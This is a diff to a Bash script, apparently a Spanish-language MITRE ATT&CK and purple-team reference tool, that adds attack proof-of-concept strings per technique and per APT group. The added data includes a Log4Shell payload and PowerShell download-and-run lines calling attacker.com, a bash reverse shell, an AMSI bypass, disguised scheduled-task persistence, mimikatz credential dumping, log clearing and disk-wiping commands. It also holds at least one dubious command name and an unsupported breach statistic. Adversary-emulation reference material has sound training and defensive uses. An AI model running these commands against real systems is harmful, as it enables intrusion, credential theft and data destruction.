@@ -49,6 +49,69 @@ MITRE_TECNICAS["TA0010"]="T1048:Exfiltration Over Alternative Protocol|T1041:Exf
 MITRE_TECNICAS["TA0040"]="T1485:Data Destruction|T1486:Data Encrypted for Impact|T1490:Inhibit System Recovery|T1498:Network Denial of Service|T1496:Resource Hijacking"
 
 # ----------------------------------------------------------------
+# BLOQUE 2.5: MITRE DATA (Descripción y Ataque)
+# Módulo 9: Matriz MITRE (📝 DESCRIPCIÓN ||| 🔴 ATAQUE)
+# ----------------------------------------------------------------
+declare -A MITRE_DATA
+
+# Auto-poblar datos genéricos para todas las técnicas
+for tac in "${!MITRE_TECNICAS[@]}"; do
+    IFS='|' read -ra tecs <<< "${MITRE_TECNICAS[$tac]}"
+    for tec in "${tecs[@]}"; do
+        tid="${tec%%:*}"
+        tnom="${tec##*:}"
+        
+        # Plantilla genérica
+        MITRE_DATA["$tid"]="📝 DESCRIPCIÓN:
+  La técnica $tid ($tnom) es empleada por cibercriminales y APTs
+  dentro de la táctica $tac para comprometer sistemas corporativos.
+|||
+🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
+  • # Reconocimiento / Análisis de vulnerabilidades
+    nmap -sV --script vuln TARGET
+  • # Simulación genérica de técnica $tid
+    echo \"Ejecutando simulación para $tid en TARGET\"
+  • # Explotación con Metasploit
+    msfconsole -q -x \"set RHOSTS TARGET; run\""
+    done
+done
+
+# Sobrescribir algunas técnicas clave con comandos específicos
+MITRE_DATA["T1566"]="📝 DESCRIPCIÓN:
+  Spearphishing Attachment/Link (T1566) envía correos maliciosos a usuarios específicos
+  para obtener acceso inicial. Es responsable del 90% de las brechas.
+|||
+🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
+  • # Enviar phishing con adjunto malicioso usando Swaks
+    swaks --to victim@TARGET --from it@TARGET --header \"Subject: Urgent Update\" --attach malware.pdf
+  • # Framework de Phishing GoPhish
+    gophish --campaign TARGET_Users
+  • # Phishing iterativo con SET (Social-Engineer Toolkit)
+    set-automate payload_creator"
+
+MITRE_DATA["T1190"]="📝 DESCRIPCIÓN:
+  Exploit Public-Facing Application (T1190) explota vulnerabilidades en servicios
+  expuestos a Internet (Web, VPN, RDP) como VPNs Fortinet o aplicaciones web Apache.
+|||
+🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
+  • # Escaneo de vulnerabilidades masivo con Nuclei
+    nuclei -u https://TARGET -t cves/ -severity critical
+  • # Explotación de inyección SQL (SQLi)
+    sqlmap -u \"https://TARGET/login.php?id=1\" --dbs --batch
+  • # Log4Shell (CVE-2021-44228)
+    curl -H 'User-Agent: \${jndi:ldap://attacker.com/a}' https://TARGET/api"
+
+MITRE_DATA["T1059"]="📝 DESCRIPCIÓN:
+  Command and Scripting Interpreter (T1059) utiliza intérpretes nativos como PowerShell,
+  CMD, o Bash para ejecutar comandos maliciosos y evadir controles de seguridad.
+|||
+🔴 ATAQUE / PRUEBA DE CONCEPTO (PoC):
+  • # Ejecución remota de código en Windows (PowerShell)
+    wmiexec.py admin:pass@TARGET \"powershell -enc [Base64_Payload]\"
+  • # Reverse shell Bash oneliner en Linux
+    ssh root@TARGET \"bash -i >& /dev/tcp/attacker/4444 0>&1\""
+
+# ----------------------------------------------------------------
 # BLOQUE 3: PURPLE TEAM DATA — RED + BLUE + DETECCIÓN por técnica
 # Formato: ATAQUE|||DEFENSA|||DETECCIÓN
 # ----------------------------------------------------------------
@@ -287,10 +350,96 @@ APT_TECNICAS["APT29"]="T1566.001:Spear Phishing Attachment|T1059.001:PowerShell|
 APT_TECNICAS["APT38"]="T1566.001:Spear Phishing|T1059.003:Windows Command Shell|T1055:Process Injection|T1071.001:HTTP C2|T1041:Exfil over C2|T1485:Data Destruction|T1486:Ransomware|T1090:Proxy|T1105:Ingress Tool Transfer"
 APT_TECNICAS["FIN7"]="T1566.001:Spear Phishing|T1059.001:PowerShell|T1027:Obfuscation|T1055.001:DLL Injection|T1486:Data Encrypted for Impact|T1119:Automated Collection|T1056.001:Keylogging|T1071.001:HTTP C2|T1078:Valid Accounts"
 
-declare -A APT_KILLCHAIN
-APT_KILLCHAIN["APT29"]="1.Spear Phishing con adjunto Office|2.Macro ejecuta PowerShell obfuscado|3.SUNBURST/WellMess backdoor instalado|4.Reconocimiento interno (BloodHound)|5.Lateral movement via RDP/WMI|6.Kerberoasting para elevar privilegios|7.Exfiltración via HTTPS a C2|8.Limpieza de logs y persistencia silenciosa"
-APT_KILLCHAIN["APT38"]="1.Spear Phishing a empleado banco|2.BLINDINGCAN dropper ejecutado|3.Reconocimiento de red SWIFT|4.Acceso a servidor de transacciones|5.HOPLIGHT backdoor para C2|6.Transferencias fraudulentas|7.DESTOVER wiper para cubrir huellas|8.Lavado via criptomonedas"
-APT_KILLCHAIN["FIN7"]="1.Email phishing con LNK malicioso|2.BABYMETAL/BIRDWATCH PowerShell|3.Carbanak backdoor instalado|4.Reconocimiento de POS y sistemas|5.DICELOADER para movimiento lateral|6.Captura de tarjetas de crédito|7.Ransomware ALPHV/BlackCat como distracción|8.Exfiltración de datos financieros"
+declare -A APT_DATA
+APT_DATA["APT29"]="T1566.001 - Spearphishing Attachment:
+  • Enviar correo con archivo .iso malicioso adjunto conteniendo un acceso directo .lnk.
+  • Payload (Ej): powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')\"
+|||
+T1059.001 - PowerShell:
+  • Ejecutar el dropper encubierto en memoria sin tocar disco (fileless malware).
+  • Bypass AMSI: [Ref.Assembly]::GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)
+|||
+T1053.005 - Scheduled Task:
+  • Establecer persistencia: schtasks /create /tn \"WindowsUpdateRunner\" /tr \"C:\\Windows\\System32\\cmd.exe /c start /b powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/persist')\" /sc onlogon
+|||
+T1078 - Valid Accounts:
+  • Comprometer credenciales locales mediante volcado de LSASS y escalar.
+  • mimikatz privilege::debug sekurlsa::logonpasswords
+|||
+T1021.001 - Remote Desktop Protocol (RDP):
+  • Movimiento lateral desde el equipo comprometido hacia servidores críticos.
+  • xfreerdp /u:Administrador /p:Password /v:TARGET
+|||
+T1027 - Obfuscation:
+  • Ofuscar scripts y tráfico para evadir EDR.
+  • Base64 encode cmds: powershell -e [B64]
+|||
+T1070.004 - File Deletion:
+  • wevtutil cl Security
+  • Remove-Item -Path C:\\Windows\\Temp\\* -Recurse -Force
+|||
+T1071.001 - Web Protocols C2:
+  • Mantener baliza C2 usando HTTPS imitando tráfico de redes sociales.
+|||
+T1041 - Exfiltration Over C2 Protocol:
+  • Comprimir datos financieros y robarlos usando el mismo canal C2."
+
+APT_DATA["APT38"]="T1566.001 - Spearphishing:
+  • Enviar documentos ofimáticos (Word/Excel) con macros maliciosas de reclutamiento falso.
+|||
+T1059.003 - Windows Command Shell:
+  • Descargar 2stg shellcode: certutil -urlcache -split -f http://evil.com/payload.exe %TEMP%\\svchost.exe
+|||
+T1055 - Process Injection:
+  • Inyectar shellcode en memoria usando inyección reflexiva (Process Hollowing).
+|||
+T1071.001 - HTTP C2:
+  • Beaconing usando infraestructura previamente comprometida (bancos vulnerables).
+|||
+T1105 - Ingress Tool Transfer:
+  • Descargar Cobalt Strike y herramientas de limpiado financiero (SWIFT manipulation).
+|||
+T1090 - Proxy:
+  • Configurar túneles usando servicios legítimos (e.g. ngrok o ssh tunneling) hacia TARGET.
+|||
+T1041 - Exfiltration Over C2 Protocol:
+  • Robar credenciales financieras de bases de datos internas.
+|||
+T1485 - Data Destruction:
+  • sdelete.exe -z C:\\Archivos_Criticos o Cipher.exe /w:C:\\
+|||
+T1486 - Data Encrypted for Impact (Ransomware):
+  • Cifrar discos duros enteros para ocultar las huellas del robo bancario (WannaCry-style)."
+
+APT_DATA["FIN7"]="T1566.001 - Spear Phishing:
+  • Quejas falsas de clientes con archivos ZIP/VBS maliciosos.
+|||
+T1059.001 - PowerShell:
+  • Ejecutar scripts en memoria (.js o vba inicial desencadena PS).
+|||
+T1027 - Obfuscation:
+  • Ofuscar binarios y scripts (Halfbaked backdoor) empaquetados pesadamente.
+|||
+T1055.001 - DLL Injection:
+  • Carga lateral de DLLs (Side-loading) para camuflaje.
+|||
+T1056.001 - Keylogging:
+  • Instalación de keyloggers en terminales de Punto de Venta (POS) en TARGET.
+|||
+T1078 - Valid Accounts:
+  • Utilizar admin de Active Directory robado para moverse lateralmente por toda la red.
+|||
+T1119 - Automated Collection:
+  • Scripts automatizados raspan tarjetas de crédito de memoria RAM (BlackPOS).
+|||
+T1071.001 - HTTP C2:
+  • Uso de dominios que imitan sitios legales (Google/MSFT) para C2.
+|||
+T1486 - Data Encrypted for Impact:
+  • Uso intermitente de ransomware (DarkSide / REvil) post-extracción de tarjetas."
+
+# Los extras (mitre_extras_1, 2, 3) 
+# ahora son importados directamente por hacx_advanced.sh
 
 # ----------------------------------------------------------------
 # BLOQUE 5: CVE RECIENTES 2024-2025
